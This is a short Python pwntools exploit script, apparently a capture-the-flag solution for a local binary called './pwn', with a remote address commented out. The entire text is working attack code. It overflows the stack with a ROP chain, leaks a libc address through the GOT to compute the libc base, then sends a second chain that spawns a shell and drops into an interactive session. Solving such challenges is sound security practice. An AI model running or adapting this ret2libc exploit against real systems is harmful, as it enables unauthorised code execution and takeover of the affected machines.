from pwn import *
context.log_level='debug'
context.arch='amd64'
context.terminal=['tmux','split','-h']
# p=remote("124.222.118.53",1027)
p=process('./pwn')
sla 	= lambda a,b: p.sendlineafter(a,b)
sa 		= lambda a,b: p.sendafter(a,b)
ra 		= lambda a: p.readuntil(a)
s		= lambda a: p.send(a)
sl		= lambda a: p.sendline(a)

rdi = 0x0000000000400633
rsi = 0x0000000000400631
got= 0x601018
ret = 0x0000000000400419
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
gdb.attach(p)
a = [0x400633,0x601018,0x400430,0x4005ab]
rop = flat(a)
s(27*p64(ret)+rop+p64(0xdeadbeef))
p.readline()
base = u64(p.readline()[:-1]+b'\0\0')-(0x7ffff7e4d5a0-0x7ffff7dc6000)
log.warning(hex(base))

s(27*p64(ret)+flat([rdi,0x1b75aa+base,0x0000000000400419,0x55410+base])+p64(0xdeadbeef))

p.interactive()